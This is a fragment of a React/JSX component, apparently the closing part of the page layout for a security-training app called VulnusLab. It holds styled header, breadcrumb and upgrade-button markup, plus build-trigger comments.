            </div>
            <button onClick={handleUpgrade} disabled={upgrading} style={{background:"linear-gradient(135deg,#1e40af,#3b82f6)",border:"none",color:"#fff",
              padding:"5px 14px",borderRadius:6,fontSize:11,fontWeight:700,cursor:upgrading?"wait":"pointer",whiteSpace:"nowrap"}}>
              {upgrading ? "..." : "Upgrade to Pro"}
            </button>
          </div>
        )}

        <div style={{background:"#0a0f1e",borderBottom:"1px solid #1e293b",padding:"0 24px",display:"flex",alignItems:"center",height:50,flexShrink:0}}>
          <div style={{display:"flex",alignItems:"center",gap:8}}>
            <span style={{fontSize:12,color:"#475569",fontWeight:500}}>VulnusLab</span>
            <span style={{color:"#334155",fontSize:14}}>/</span>
            <span style={{fontSize:13,color:"#cbd5e1",fontWeight:600,letterSpacing:"0.2px"}}>{topic?topic.label:active}</span>
          </div>
          <div style={{marginLeft:"auto",display:"flex",alignItems:"center",gap:12}}>
            <span style={{fontSize:11,color:"#334155",fontFamily:"JetBrains Mono,monospace"}}>{new Date().toLocaleDateString()}</span>
          </div>
        </div>

        <div style={{padding:"18px 24px 10px",borderBottom:"1px solid #1e293b",background:"#0a0f1e",flexShrink:0}}>
          <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",flexWrap:"wrap",gap:10}}>
            <div style={{display:"flex",alignItems:"center",gap:12}}>
              <span style={{fontSize:24}}>{topic?topic.icon:"⚙️"}</span>
              <div>
                <h1 style={{fontSize:17,fontWeight:700,color:"#f1f5f9",marginBottom:2}}>{topic?topic.label:active}</h1>
                <p style={{fontSize:11,color:"#475569"}}>Real Kali Linux tools | Module {topic?topic.num:"--"}</p>
              </div>
            </div>
            <div style={{display:"flex",gap:6}}>
            </div>
          </div>
        </div>

        <div style={{flex:1,overflowY:"auto",padding:24}}>
          {renderContent()}
        </div>
      </div>
    </div>
  );
}
// Build 1778915031

// Build trigger: 20260516-070655

// Delete-button build trigger: 1778915631
